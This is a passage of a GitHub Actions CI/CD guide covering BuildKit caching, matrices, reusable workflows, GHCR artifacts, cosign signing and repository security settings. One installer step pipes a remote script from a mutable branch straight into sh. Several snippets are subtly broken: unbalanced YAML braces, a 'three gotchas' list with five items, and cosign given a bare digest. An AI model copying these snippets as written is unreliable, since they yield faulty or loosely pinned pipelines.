- uses: docker/setup-buildx-action@v3
  with:
    driver-opts: image=moby/buildkit:v0.17.1   # ⭐ pin BuildKit if you need a feature
    buildkitd-flags: --debug

- uses: docker/login-action@v3
  with:
    registry: ghcr.io
    username: ${{ github.actor }}
    password: ${{ secrets.GITHUB_TOKEN }}      # ⭐ works with `packages: write`

- uses: docker/build-push-action@v6
  id: build
  with:
    context: apps/shop-api
    file: apps/shop-api/Dockerfile
    push: true                                  # ⭐ or `load: true` for a local-only build
    tags: |
      ghcr.io/3558bhk/shop-api:${{ steps.meta.outputs.version }}
      ghcr.io/3558bhk/shop-api:sha-${{ github.sha }}
      ghcr.io/3558bhk/shop-api:latest
    # ⭐⭐ LAYER 3+4: the registry AS the cache
    cache-from: type=registry,ref=ghcr.io/3558bhk/shop-api:buildcache
    cache-to:   type=registry,ref=ghcr.io/3558bhk/shop-api:buildcache,mode=max,ignore-error=true
    # ⭐ mode=max caches ALL stages, not just the final one
    # ⭐ ignore-error=true — a cache push failure must never fail the build
    provenance: mode=max                        # ⭐⭐ SLSA provenance
    sbom: true                                  # ⭐⭐ a CycloneDX SBOM in the manifest
    attestations: |                             # ⭐ the newer attestation syntax
      type=provenance,mode=max
      type=sbom
    build-args: |
      VERSION=${{ steps.meta.outputs.version }}
      BUILD_SHA=${{ github.sha }}
      BUILD_DATE=${{ steps.meta.outputs.date }}
    platforms: linux/amd64                       # ⭐ or linux/amd64,linux/arm64
    outputs: type=image,oci-mediatypes=true,compression=zstd
    secrets: |                                   # ⭐⭐ BuildKit secrets, NOT build args
      "github_token=${{ secrets.GITHUB_TOKEN }}"
    labels: |
      org.opencontainers.image.source=${{ github.server_url }}/${{ github.repository }}
      org.opencontainers.image.revision=${{ github.sha }}
      org.opencontainers.image.version=${{ steps.meta.outputs.version }}
      org.opencontainers.image.created=${{ steps.meta.outputs.date }}
      org.opencontainers.image.url=${{ github.server_url }}/${{ github.repository }}
```

```yaml
# ⭐ the local-disk alternative (faster on a self-hosted runner, useless on hosted)
- uses: actions/cache@v4
  with:
    path: /tmp/.buildx-cache
    key: ${{ runner.os }}-buildx-${{ github.sha }}
    restore-keys: ${{ runner.os }}-buildx-
- uses: docker/build-push-action@v6
  with:
    cache-from: type=local,src=/tmp/.buildx-cache
    cache-to:   type=local,dest=/tmp/.buildx-cache-new,mode=max
- run: |                                          # ⭐⭐ the famous cache-rotation hack:
    rm -rf /tmp/.buildx-cache                     #    BuildKit local caches GROW FOREVER
    mv /tmp/.buildx-cache-new /tmp/.buildx-cache  #    because it never prunes on write.

# ⭐ the GitHub Actions cache backend (built for this exact problem)
- uses: docker/build-push-action@v6
  with:
    cache-from: type=gha
    cache-to:   type=gha,mode=max
    # ⭐ type=gha stores in the Actions cache: 10 GB per repo, evicted after 7 days
    #    of no access. Automatic, no registry permission needed, and scoped by
    #    `scope=` if you want separate caches per service:
    # cache-from: type=gha,scope=${{ matrix.service }}
    # cache-to:   type=gha,mode=max,scope=${{ matrix.service }}
```

```bash
# ⭐ MEASURE IT. This is the whole point.
# run 1 (cold):   echo "::notice::cold build"
# run 2 (warm):   compare
gh run list --workflow ci.yml --limit 6 --json databaseId,displayTitle,createdAt,updatedAt \
  | jq -r '.[] | "\(.databaseId)  \(.createdAt)  \(.updatedAt)"'
# and read the step timings from the log:
gh run view $ID --log | grep -E '^.*\tBuild and push\t' | head
# Build and push       3m 42s   ← cold
# Build and push      41s      ← warm with mode=max   ⭐ 82% faster

# ⭐ cache size and hit rate, via the API
gh api repos/3558Bhk/shop/actions/caches --jq '{
  total: .total_count,
  size_mb: ((.actions_caches | map(.size_in_bytes) | add) / 1048576 | floor),
  entries: [.actions_caches[] | {key, size_mb: ((.size_in_bytes/1048576)|floor),
                                 last_accessed, created_at}]
}'
gh api repos/3558Bhk/shop/actions/cache/usage --jq '{count, size_in_bytes}'
gh api repos/3558Bhk/shop/actions/caches -X DELETE          # ⭐ clear them all
gh api "repos/3558Bhk/shop/actions/caches?key=linux-maven-" -X DELETE
```

---

## 5 · Concurrency, matrices and parallelism

### 5.1 Concurrency

```yaml
# ⭐ workflow-level: one run per workflow+ref, cancel the superseded one
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ !contains(fromJSON('["schedule","release"]'), github.event_name) }}

# ⭐⭐ the DEPLOYMENT concurrency group — never cancel a deploy, never run two
concurrency:
  group: deploy-production            # ⭐ NOT keyed on github.ref
  cancel-in-progress: false           # ⭐⭐ QUEUE instead of cancelling
# → two merges to main in quick succession produce two SERIAL production deploys,
#   not two parallel ones. This is the mutex.

# ⭐ per-job concurrency
jobs:
  integration:
    concurrency:
      group: integration-db           # ⭐ only one job may hold the shared test database
      cancel-in-progress: false
```

```bash
# ⭐ the GitHub-native alternative for a production mutex: the Deployments API
DEPLOY_ID=$(gh api repos/3558Bhk/shop/deployments -X POST \
  -f ref="${{ github.sha }}" -f environment=production \
  -f task=deploy -f 'payload[sha]='"$SHA" --jq .id)
gh api "repos/3558Bhk/shop/deployments/$DEPLOY_ID/statuses" -X POST \
  -f state=in_progress -f description='deploying'
# …deploy…
gh api "repos/3558Bhk/shop/deployments/$DEPLOY_ID/statuses" -X POST \
  -f state=success -f environment_url=https://shop.example.com
# ⭐ on failure: -f state=failure
# → this populates the Environments → Deployments tab with a real history.
```

### 5.2 Matrices — every shape

```yaml
# ── 1. the cartesian product ────────────────────────────────────
strategy:
  fail-fast: false
  matrix:
    java: ['17', '21', '24']
    os: [ubuntu-latest, macos-latest]
    db: [postgres-16, postgres-17]
    # ⭐ 3 × 2 × 2 = 12 jobs

# ── 2. `include` adds combinations AND overrides ────────────────
strategy:
  matrix:
    os: [ubuntu-latest]
    version: ['17', '21']
    include:
      - {os: ubuntu-latest, version: '21', coverage: true}    # ⭐ OVERRIDES the existing
                                                              #    ubuntu+21 combination
      - {os: macos-latest, version: '21', experimental: true} # ⭐ ADDS a new combination

# ── 3. `exclude` removes ────────────────────────────────────────
    exclude:
      - {os: macos-latest, version: '17'}                     # ⭐ a broken pairing

# ── 4. ⭐⭐ THE DYNAMIC MATRIX — from a previous job ─────────────
jobs:
  plan:
    outputs: {matrix: ${{ steps.m.outputs.matrix }}}
    steps:
      - id: m
        run: |
          MATRIX=$(jq -cn '[
            {service:"shop-api",     language:"java",   timeout:25},
            {service:"checkout",     language:"go",     timeout:15},
            {service:"order-worker", language:"python", timeout:15}
          ]')
          echo "matrix=$MATRIX" >> "$GITHUB_OUTPUT"
  build:
    needs: plan
    strategy:
      fail-fast: false
      matrix:
        include: ${{ fromJSON(needs.plan.outputs.matrix) }}    # ⭐⭐ fromJSON is the key
    runs-on: ubuntu-latest
    timeout-minutes: ${{ matrix.timeout }}
    steps:
      - run: ./ci/test-${{ matrix.language }}.sh "${{ matrix.service }}"

# ── 5. ⭐ a matrix of JSON objects read from a file in the repo
jobs:
  plan:
    outputs: {matrix: ${{ steps.m.outputs.matrix }}}
    steps:
      - uses: actions/checkout@v7
      - id: m
        run: echo "matrix=$(jq -c . ci/services.json)" >> "$GITHUB_OUTPUT"
# ci/services.json:
#   [{"service":"shop-api","language":"java","timeout":25,"dockerfile":"Dockerfile"},
#    {"service":"checkout","language":"go","timeout":15,"dockerfile":"Dockerfile.multiarch"}]

# ── 6. max-parallel and the shard pattern ⭐ ────────────────────
strategy:
  fail-fast: false
  max-parallel: 4                    # ⭐ never exceed the repo's concurrent-job limit
  matrix:
    shard-index: [0, 1, 2, 3]
    shard-total: [4]
steps:
  - run: |
      npx playwright test \
        --shard=${{ matrix.shard-index }}/${{ matrix.shard-total }} \
        --reporter=junit
  - uses: actions/upload-artifact@v4
    if: always()
    with:
      name: e2e-shard-${{ matrix.shard-index }}
      path: test-results/
```

```yaml
# ⭐ matrix identity in the job name and the summary
jobs:
  build:
    name: 🏗️ ${{ matrix.service }} [${{ strategy.job-index }}/${{ strategy.job-total }}]
    strategy:
      matrix: {service: [a, b, c]}
    steps:
      - run: |
          echo "I am job ${{ strategy.job-index }} of ${{ strategy.job-total }}"
          echo "fail-fast is ${{ strategy.fail-fast }}"
```

---

## 6 · Reuse — composite actions, reusable workflows, custom actions

### 6.1 A composite action ⭐ (your own `uses:`)

```yaml
# .github/actions/setup-shop/action.yml
name: 'Set up the shop build environment'
description: >
  Installs the toolchain for one language, restores the dependency cache,
  and adds the common CLI tools. One step instead of eight.

inputs:
  language:
    description: 'java | go | python | node'
    required: true
  java-version:
    description: 'The JDK version'
    required: false
    default: '21'
  go-version:
    required: false
    default: '1.23'
  node-version:
    required: false
    default: '22'
  python-version:
    required: false
    default: '3.13'
  install-extra-tools:
    description: 'Also install trivy, cosign, kubeconform'
    required: false
    default: 'true'

outputs:
  cache-hit:
    description: 'Whether the dependency cache was restored'
    value: ${{ steps.cache.outcome }}
  tool-versions:
    description: 'A JSON blob of the resolved versions'
    value: ${{ steps.report.outputs.versions }}

runs:
  using: 'composite'                     # ⭐⭐ a composite action = a list of steps
  steps:
    - name: Validate the input
      shell: bash
      run: |
        case "${{ inputs.language }}" in
          java|go|python|node) echo "  language: ${{ inputs.language }}" ;;
          *) echo "::error::unsupported language '${{ inputs.language }}'"; exit 1 ;;
        esac

    - name: Install Java
      if: inputs.language == 'java'
      uses: actions/setup-java@v5
      with:
        distribution: temurin
        java-version: ${{ inputs.java-version }}
        cache: maven

    - name: Install Go
      if: inputs.language == 'go'
      uses: actions/setup-go@v5
      with: {go-version: ${{ inputs.go-version }}, cache: true}

    - name: Install Node
      if: inputs.language == 'node'
      uses: actions/setup-node@v4
      with: {node-version: ${{ inputs.node-version }}, cache: npm,
             cache-dependency-path: apps/shop-ui/package-lock.json}

    - name: Install Python
      if: inputs.language == 'python'
      uses: actions/setup-python@v5
      with: {python-version: ${{ inputs.python-version }}, cache: pip,
             cache-dependency-path: apps/order-worker/requirements*.txt}

    - name: Install the extra tools
      if: inputs.install-extra-tools == 'true'
      shell: bash
      run: |
        set -euo pipefail
        for tool in trivy cosign kubeconform; do
          command -v $tool >/dev/null && { echo "  $tool already present"; continue; }
        done
        # ⭐ trivy
        curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh \
          | sh -s -- -b /usr/local/bin v0.58.1
        # ⭐ cosign
        curl -sSfL "https://github.com/sigstore/cosign/releases/download/v2.4.1/cosign-linux-amd64" \
          -o /usr/local/bin/cosign && chmod +x /usr/local/bin/cosign
        # ⭐ kubeconform
        curl -sSfL "https://github.com/yannh/kubeconform/releases/download/v0.6.7/kubeconform-linux-amd64.tar.gz" \
          | tar xz -C /usr/local/bin
        trivy --version | head -1; cosign version 2>/dev/null | head -1; kubeconform -v

    - name: Warm the Helm and kubectl cache
      id: cache
      uses: actions/cache@v4
      with:
        path: |
          ~/.cache/helm
        key: ${{ runner.os }}-helm-${{ env.HELM_VERSION }}

    - name: Report
      id: report
      shell: bash
      run: |
        VERSIONS=$(jq -cn --arg l "${{ inputs.language }}" '{language:$l}')
        echo "versions=$VERSIONS" >> "$GITHUB_OUTPUT"
        echo "### 🧰 Toolchain" >> "$GITHUB_STEP_SUMMARY"
        echo "\`$VERSIONS\`" >> "$GITHUB_STEP_SUMMARY"
```

```yaml
# ⭐ using it — one line replaces eight
jobs:
  test:
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/setup-shop          # ⭐ a path in THIS repo
        with: {language: java, java-version: '21'}
      - uses: 3558Bhk/pipeline-actions/setup-shop@v1  # ⭐ or published in another repo
        with: {language: go}
```

### 6.2 A reusable workflow ⭐⭐ (your own `jobs:`)

```yaml
# .github/workflows/reusable-build.yml
# ⭐⭐ `on: workflow_call` is what makes it reusable.
name: Reusable — build and push one service

on:
  workflow_call:
    inputs:
      service:      {description: 'The service directory under apps/', type: string, required: true}
      language:     {type: string, required: true}
      registry:     {type: string, default: ghcr.io/3558bhk}
      push:         {type: boolean, default: true}
      scan:         {type: boolean, default: true}
      platforms:    {type: string, default: linux/amd64}
      timeout:      {type: number, default: 30}
      cache-scope:  {type: string, default: ''}
    secrets:
      registry-token:
        description: 'A token with packages:write. Not needed for GITHUB_TOKEN.'
        required: false
      cosign-key:
        required: false
    outputs:
      digest:  {description: 'The image digest', value: ${{ jobs.build.outputs.digest }}}
      image:   {description: 'The image reference', value: ${{ jobs.build.outputs.image }}}
      version: {description: 'The semantic version', value: ${{ jobs.build.outputs.version }}
      sbom-artifact: {value: ${{ jobs.build.outputs.sbom }}

permissions:
  contents: read
  packages: write
  id-token: write                          # ⭐ for keyless cosign signing

jobs:
  build:
    name: 🏗️ ${{ inputs.service }}
    runs-on: ubuntu-latest
    timeout-minutes: ${{ inputs.timeout }}
    outputs:
      digest: ${{ steps.build.outputs.digest }}
      image:  ${{ steps.meta.outputs.image }}
      version: ${{ steps.meta.outputs.version }}
      sbom: sbom-${{ inputs.service }}
    steps:
      - uses: actions/checkout@v7
        with: {fetch-depth: 0}

      - uses: ./.github/actions/setup-shop
        with: {language: ${{ inputs.language }}}

      - name: Compute the metadata
        id: meta
        run: |
          set -euo pipefail
          SERVICE="${SERVICE_INPUT}"
          VERSION=$(git describe --tags --always --match "v*" 2>/dev/null || echo "0.0.0")
          [[ "$VERSION" == v* ]] && VERSION="${VERSION#v}"
          if [[ "${GITHUB_REF}" == refs/tags/* ]]; then
            VERSION="${GITHUB_REF_NAME#v}"
          elif [[ "${GITHUB_EVENT_NAME}" == "pull_request" ]]; then
            VERSION="pr-${GITHUB_RUN_NUMBER}-${GITHUB_SHA:0:7}"
          else
            VERSION="${VERSION}-sha.${GITHUB_SHA:0:7}"
          fi
          IMAGE="${REGISTRY_INPUT}/${SERVICE}"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "image=$IMAGE"     >> "$GITHUB_OUTPUT"
          echo "full=${IMAGE}:${VERSION}" >> "$GITHUB_OUTPUT"
          echo "date=$(date -u +%FT%TZ)" >> "$GITHUB_OUTPUT"
        env:
          SERVICE_INPUT: ${{ inputs.service }}
          REGISTRY_INPUT: ${{ inputs.registry }}

      - name: Test
        run: ./ci/test-${{ inputs.language }}.sh "${{ inputs.service }}"

      - uses: docker/setup-buildx-action@v3

      - uses: docker/login-action@v3
        if: inputs.push
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.registry-token || secrets.GITHUB_TOKEN }}
          # ⭐⭐ `secrets.X || secrets.Y` — fall back to the automatic token

      - uses: docker/metadata-action@v5
        id: tags
        with:
          images: ${{ steps.meta.outputs.image }}
          tags: |
            type=raw,value=${{ steps.meta.outputs.version }},enable=true
            type=sha,prefix=sha-,format=long
            type=ref,event=tag
            type=ref,event=pr,prefix=pr-
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}

      - uses: docker/build-push-action@v6
        id: build
        with:
          context: apps/${{ inputs.service }}
          file: apps/${{ inputs.service }}/Dockerfile
          platforms: ${{ inputs.platforms }}
          push: ${{ inputs.push }}
          load: ${{ !inputs.push }}
          tags: ${{ steps.tags.outputs.tags }}
          labels: ${{ steps.tags.outputs.labels }}
          cache-from: type=gha,scope=${{ inputs.cache-scope || inputs.service }}
          cache-to:   type=gha,mode=max,scope=${{ inputs.cache-scope || inputs.service }}
          provenance: mode=max
          sbom: true
          build-args: |
            VERSION=${{ steps.meta.outputs.version }}
            BUILD_SHA=${{ github.sha }}
            BUILD_DATE=${{ steps.meta.outputs.date }}

      - name: Extract the digest
        id: digest
        run: |
          set -euo pipefail
          if [[ "${{ inputs.push }}" == "true" ]]; then
            D="${{ steps.build.outputs.digest }}"
          else
            D=$(docker image inspect "${{ steps.meta.outputs.full }}" \
                 --format '{{index .RepoDigests 0}}' 2>/dev/null | cut -d@ -f2 || echo "sha256:local")
          fi
          echo "digest=$D" >> "$GITHUB_OUTPUT"
          echo "  image:  ${{ steps.meta.outputs.full }}"
          echo "  digest: $D"
          # ⭐ write the digest to a file so the CD workflow can consume it
          mkdir -p image-info
          jq -n --arg svc "${{ inputs.service }}" --arg img "${{ steps.meta.outputs.full }}" \
                --arg d "$D" --arg sha "$GITHUB_SHA" --arg run "$GITHUB_RUN_ID" \
            '{service:$svc, image:$img, digest:$d, revision:$sha, runId:$run,
              builtAt:(now|todate)}' > "image-info/${{ inputs.service }}.json"
          echo "$D" > "image-info/${{ inputs.service }}.digest"

      - name: Scan
        if: inputs.scan
        run: |
          set -euo pipefail
          IMAGE="${{ steps.meta.outputs.full }}"
          mkdir -p reports
          trivy image --exit-code 1 --severity CRITICAL,HIGH --ignore-unfixed \
            --format table --scanners vuln,secret,misconfig \
            --timeout 10m "$IMAGE" 2>&1 | tee reports/trivy-${{ inputs.service }}.txt
          trivy image --format sarif --output "reports/trivy-${{ inputs.service }}.sarif" "$IMAGE" || true
          trivy image --format cyclonedx --output "reports/sbom-${{ inputs.service }}.cdx.json" "$IMAGE"
          # ⭐ the gate
          CRIT=$(trivy image --severity CRITICAL --quiet --format json "$IMAGE" \
                 | jq '[.Results[].Vulnerabilities[]?] | length')
          echo "  critical: $CRIT"
          if (( CRIT > 0 )); then
            echo "::error::$CRIT CRITICAL vulnerabilities in $IMAGE"
            exit 1
          fi

      - name: ⭐ Sign with cosign (keyless)
        if: inputs.push && hashFiles(format('reports/sbom-{0}.cdx.json', inputs.service)) != ''
        env:
          COSIGN_EXPERIMENTAL: '1'
        run: |
          set -euo pipefail
          cosign sign --yes \
            --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
            --certificate-identity-regexp="^https://github.com/${GITHUB_REPOSITORY}/\.github/workflows/.*@refs/heads/main$" \
            "${{ steps.meta.outputs.full }}@${{ steps.digest.outputs.digest }}"
          # ⭐ attach the SBOM as a signed artifact
          cosign attest --yes --predicate "reports/sbom-${{ inputs.service }}.cdx.json" \
            --type cyclonedx "${{ steps.meta.outputs.full }}@${{ steps.digest.outputs.digest }}"

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: image-info-${{ inputs.service }}
          path: image-info/
          retention-days: 90
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: reports-${{ inputs.service }}
          path: reports/
          retention-days: 90
```

```yaml
# ⭐⭐ CALLING a reusable workflow — it's a JOB, not a step
# .github/workflows/ci.yml
jobs:
  shop-api:
    uses: ./.github/workflows/reusable-build.yml          # ⭐ same repo
    with:
      service: shop-api
      language: java
      push: ${{ github.event_name != 'pull_request' }}     # ⭐⭐ don't push on a PR
      timeout: 30
    secrets:
      registry-token: ${{ secrets.GHCR_TOKEN }}
    permissions:                                           # ⭐⭐ the CALLER must grant
      contents: read                                       #    what the callee needs
      packages: write
      id-token: write

  checkout:
    uses: ./.github/workflows/reusable-build.yml
    with: {service: checkout, language: go, push: false}

  # ⭐ a reusable workflow from ANOTHER repo, PINNED
  org-standard:
    uses: 3558Bhk/pipeline-templates/.github/workflows/build.yml@v2.3.1   # ⭐⭐ A TAG
    with: {service: order-worker, language: python}
    secrets: inherit        # ⛔ prefer explicit secrets over `inherit`
```

⚠️ **The three reusable-workflow gotchas:**

```
1. ⭐ `permissions:` is NOT inherited. The CALLER must grant every permission the
   callee needs, or the callee runs with read-only defaults.
2. ⭐ Secrets are NOT inherited unless you say `secrets: inherit` (don't) or pass
   them explicitly.
3. ⛔ A reusable workflow CANNOT use `github.event` from the caller directly —
   it sees the `workflow_call` event. Pass what you need as `inputs`.
   ⭐ In 2024+ `github.event` IS forwarded, but `github.event_name` is `workflow_call`.
4. ⛔ A reusable workflow cannot be called by a job that has `needs:` on a job in
   the same workflow AND be in a matrix in the same step — nesting has rules.
5. ⭐ Reusable workflows can nest up to 4 levels deep.
```

### 6.3 A Docker-container action

```yaml
# .github/actions/trivy-gate/action.yml
name: 'Trivy gate'
description: 'Fail if the image has more than N critical vulnerabilities'
inputs:
  image:    {description: 'The image reference', required: true}
  max-critical: {required: false, default: '0'}
  severity:     {required: false, default: 'CRITICAL,HIGH'}
runs:
  using: 'docker'
  image: 'docker://aquasec/trivy:0.58.1'          # ⭐ or `image: Dockerfile` for a local one
  args:
    - image
    - --exit-code
    - '1'
    - --severity
    - ${{ inputs.severity }}
    - --ignore-unfixed
    - ${{ inputs.image }}
```

```yaml
# a JavaScript action — .github/actions/parse-coverage/action.yml
name: 'Parse coverage'
runs:
  using: 'node20'
  main: 'dist/index.js'                            # ⭐ BUNDLED with ncc — no node_modules
```

```bash
# the three ways to pin a third-party action ⭐⭐
uses: actions/checkout@v7                          # a TAG — moves when the tag moves
uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b   # ⭐⭐ A FULL SHA — safest
uses: docker/build-push-action@v6.10.0             # ⭐ a specific version tag
uses: ./path/in/this/repo                          # your own code
uses: my-org/my-repo/my-action@v1                  # a subdirectory in another repo

# ⭐⭐ RECOMMENDATION: pin public actions to a FULL COMMIT SHA and record the
#    version in a comment. Dependabot will bump the SHA for you.
uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b  # v7.0.0

# ⭐ and let Dependabot maintain the pins — .github/dependabot.yml:
#   - package-ecosystem: github-actions
#     directory: /
#     schedule: {interval: weekly}
```

---

## 7 · GHCR, artifacts and the supply chain

### 7.1 GHCR permissions

```
⚠️ THE #1 GHCR FAILURE: the package's visibility and its linked repository.

1. build the image → GHCR creates the package as PRIVATE by default
2. Package Settings → ⭐ "Manage Actions access" → add 3558Bhk/shop
   with role: ⭐ WRITE  (Admin for full control)
3. or make the package PUBLIC (Package Settings → Change visibility)

Without step 2 you get:
  ⛔ "denied: requested access to the resource is denied"
  even though `packages: write` is set and GITHUB_TOKEN is correct.
```

```bash
# the CLI equivalents
gh api user/packages?package_type=container --jq '.[].name'
gh api orgs/ORG/packages?package_type=container --jq '.[].name'
gh api repos/3558Bhk/shop/actions/permissions --jq .
# {enabled: true, allowed_actions: "all"}
gh api repos/3558Bhk/shop/actions/permissions/workflow --jq .
# {default_workflow_permissions: "read", can_approve_pull_requests: false}
# ⭐⭐ SET THIS AT THE ORG LEVEL:
gh api orgs/ORG/actions/permissions/workflow -X PUT \
  -f default_workflow_permissions=read -F can_approve_pull_requests=false

# ⭐ link a package to a repo (the API way)
gh api user/packages/container/shop-api/repository -X POST \
  -f repository=3558Bhk/shop   # (availability varies; the UI is reliable)
```

### 7.2 Artifacts

```yaml
# ⭐ upload/download in v4 — the semantics changed from v3 and people get bitten
- uses: actions/upload-artifact@v4
  with:
    name: manifests                     # ⭐⭐ must be UNIQUE per run
                                        #    (use the matrix value in the name!)
    path: dist/**
    if-no-files-found: error            # ⭐ fail loudly, don't silently upload nothing
    retention-days: 14                  # ⭐ max 90
    compression-level: 6                # 0–9
    overwrite: false                    # ⛔ v4 ERRORS if the name exists (v3 appended)

- uses: actions/download-artifact@v4
  with:
    name: manifests                     # ⭐ a specific one
    path: ./manifests
    merge-multiple: false

# ⭐⭐ download ALL of a pattern, merged into one directory
- uses: actions/download-artifact@v4
  with:
    pattern: image-info-*               # ⭐ a glob
    path: ./all-info
    merge-multiple: true                # ⭐ flatten into `path` instead of subdirs

# ⭐ download from ANOTHER RUN (cross-workflow, or a re-run)
- uses: actions/download-artifact@v4
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    run-id: ${{ github.event.workflow_run.id }}
    name: manifests
    # ⭐ or download the LATEST successful run of a workflow:
- uses: dawidd6/action-download-artifact@v7
  with:
    workflow: ci.yml
    branch: main
    workflow_conclusion: success
    name: manifests
    path: ./manifests
    # ⭐⭐ THIS is the "promote the artifact that staging validated" mechanism
```

```bash
gh run download 1234567890 --name manifests --dir ./dl
gh run download 1234567890 --pattern 'image-info-*' --dir ./dl
gh api repos/3558Bhk/shop/actions/runs/1234567890/artifacts --jq '.artifacts[] | {name,size_in_bytes,expired}'
```

### 7.3 The full supply chain in one workflow ⭐

```yaml
# .github/workflows/release.yml
name: Release
on:
  push:
    tags: ['v*.*.*']

permissions:
  contents: write          # ⭐ to create the GitHub Release
  packages: write
  id-token: write          # ⭐⭐ for keyless signing and the attestations API
  attestations: write      # ⭐⭐ for the artifact attestations API

jobs:
  release:
    runs-on: ubuntu-latest
    environment: production
    timeout-minutes: 45
    outputs: {digest: ${{ steps.build.outputs.digest }}}
    steps:
      - uses: actions/checkout@v7
        with: {fetch-depth: 0}

      - name: Build, SBOM, provenance
        id: build
        uses: docker/build-push-action@v6
        with:
          context: apps/shop-api
          push: true
          tags: ghcr.io/3558bhk/shop-api:${{ github.ref_name }}
          provenance: mode=max
          sbom: true

      # ⭐ 1. SIGN the image (keyless — the identity is the OIDC token)
      - name: cosign sign
        run: |
          cosign sign --yes "${{ steps.build.outputs.digest }}"
        env:
          DIGEST: ${{ steps.build.outputs.digest }}

      # ⭐ 2. SIGN the SBOM separately
      - name: cosign attest the SBOM
        run: |
          cosign attest --yes --predicate sbom.cdx.json --type cyclonedx \
            "${{ steps.build.outputs.digest }}"

      # ⭐ 3. ⭐⭐ THE ATTESTATIONS API — GitHub-native, verified in the UI
      - name: Attest the build
        uses: actions/attest-build-provenance@v2
        with:
          subject-name: ghcr.io/3558bhk/shop-api
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
      - name: Attest the SBOM
        uses: actions/attest-sbom@v2
        with:
          subject-name: ghcr.io/3558bhk/shop-api
          subject-digest: ${{ steps.build.outputs.digest }}
          sbom-path: sbom.cdx.json

      # ⭐ 4. VERIFY it, in the same pipeline (fail closed if you can't)
      - name: Verify the signature
        run: |
          cosign verify "${{ steps.build.outputs.digest }}" \
            --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
            --certificate-identity-regexp="^https://github.com/${GITHUB_REPOSITORY}/\.github/workflows/release\.yml@refs/tags/v.*" \
            | jq '.[0] | {issuer: .critical.identity."docker-reference", sig: .signature[0:20]}'
          cosign verify-attestation --type cyclonedx "${{ steps.build.outputs.digest }}" \
            --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
            --certificate-identity-regexp=".*" | jq .payload | base64 -d | jq .
      - name: Verify via the GitHub attestations API
        run: gh attestation verify "oci://${{ steps.build.outputs.image }}" --owner 3558Bhk

      # ⭐ 5. the GitHub Release with the changelog
      - name: Generate the changelog
        id: changelog
        run: |
          set -euo pipefail
          PREV=$(git describe --tags --abbrev=0 "${GITHUB_REF_NAME}^" 2>/dev/null || echo "")
          if [[ -n "$PREV" ]]; then
            git log --pretty=format:'* %s ([%h](https://github.com/'"$GITHUB_REPOSITORY"'/commit/%H)) by @%an' \
              "$PREV..${GITHUB_REF_NAME}" > CHANGES.md
          else
            git log --pretty=format:'* %s (%h)' > CHANGES.md
          fi
          echo "### 📦 What's new" | cat - CHANGES.md > release-notes.md
          printf '\n### 🔏 Provenance\n\n```\ncosign verify %s\n```\n' \
            "${{ steps.build.outputs.digest }}" >> release-notes.md
          printf '\n### 🧾 SBOM\n\n`%d` packages — see the attestation.\n' \
            "$(jq '.components | length' sbom.cdx.json)" >> release-notes.md

      - uses: softprops/action-gh-release@v2
        with:
          body_path: release-notes.md
          draft: false
          prerelease: ${{ contains(github.ref_name, '-') }}    # ⭐ v1.4.0-rc.1 → prerelease
          generate_release_notes: false
          files: |
            sbom.cdx.json
            dist/**
          discussion_category_name: Releases
          token: ${{ secrets.GITHUB_TOKEN }}
```

```bash
# ⭐ verifying from a CONSUMER — the point of all this
cosign verify ghcr.io/3558bhk/shop-api:v1.4.2 \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  --certificate-identity-regexp='^https://github.com/3558Bhk/shop/.github/workflows/release.yml@refs/tags/v.*'
gh attestation verify oci://ghcr.io/3558bhk/shop-api:v1.4.2 --owner 3558Bhk
gh attestation trusted-root oci://ghcr.io/3558bhk/shop-api:v1.4.2
gh sbom view --repository 3558Bhk/shop
```

---

## 8 · Security — the settings that matter ⭐⭐

### 8.1 The settings checklist

```
ORGANIZATION Settings → Actions → General
  ☑ Enable GitHub Actions for: all repositories
  ⭐ "Fork pull request workflows from outside collaborators":
       Require approval for all outside collaborators          ← ⭐⭐
  ⭐ "Workflow permissions":
       ☑ Read repository contents and packages permissions     ← ⭐⭐ the safe default
       ☐ Allow GitHub Actions to create and approve pull requests  ← OFF
  ☑ Disable actions for: (restrict to `actions/*` and your org?)
       "Allow all actions and reusable workflows"  ← ⛔ too permissive for a real org
       ⭐ "Allow 3558Bhk/*, actions/*, docker/*, *" — an allowlist

REPOSITORY Settings → Actions → General
  ⭐ Workflow permissions → Read repository contents  (as above)
  ⭐ Fork PR workflows → Require approval for first-time contributors

REPOSITORY Settings → Code security and analysis
  ☑ ⭐⭐ Secret scanning                        (free for public repos)
  ☑ ⭐⭐ Push protection                        ← ⭐ blocks the commit, not just reports it
  ☑ ⭐⭐ Push protection for custom patterns
  ☑ Code scanning → CodeQL Analysis: ⭐ "default" or "advanced" setup
  ☑ Dependency graph
  ☑ ⭐ Dependabot alerts
  ☑ ⭐ Dependabot security updates              ← opens the fix PR automatically
  ☑ Private vulnerability reporting

REPOSITORY Settings → Branches → Branch protection rules (main)
  ☑ Require a pull request before merging
     ☑ Require approvals: 1
     ☑ ⭐ Dismiss stale pull request approvals when new commits are pushed
     ☑ Require review from Code Owners          ← ⭐⭐ CODEOWNERS enforcement
     ☑ Require approval of the last push
  ☑ Require status checks to pass before merging
     ☑ ⭐ Require branches to be up to date before merging
     ☑ Status checks: ci / lint, ci / test (shop-api), security / scan …
  ☑ Require conversation resolution before merging
  ☑ Require signed commits                       ← ⭐⭐ pairs with cosign
  ☑ Do not allow bypassing the above settings     ← ⭐⭐ including admins
  ☑ Do not allow force pushes
  ☑ Require linear history                        ← ⭐ squash or rebase merges
  ☑ ⭐ Require deployment to succeed: production   ← an environment gate as a branch rule
  ☑ Require a merge queue                         ← ⭐ the answer to "merge conflicts at scale"
  ☑ Restrict pushes that create files > 100 MB
